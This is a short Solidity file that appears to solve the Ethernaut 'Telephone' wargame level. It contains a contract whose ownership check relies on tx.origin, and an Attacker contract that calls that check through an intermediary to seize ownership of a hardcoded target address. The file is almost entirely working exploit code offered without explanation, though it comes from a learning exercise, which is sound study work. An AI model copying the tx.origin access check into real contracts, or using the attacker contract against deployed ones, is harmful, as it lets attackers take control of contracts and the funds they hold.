// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attacker {
    Telephone public vulnerableContract =
        Telephone(0x9e5BE9e81Eaf8dF963a34ABc64bBE709068F7368); // ethernaut vulnerable contract

    function attack() external payable {
        vulnerableContract.changeOwner(msg.sender);
    }
}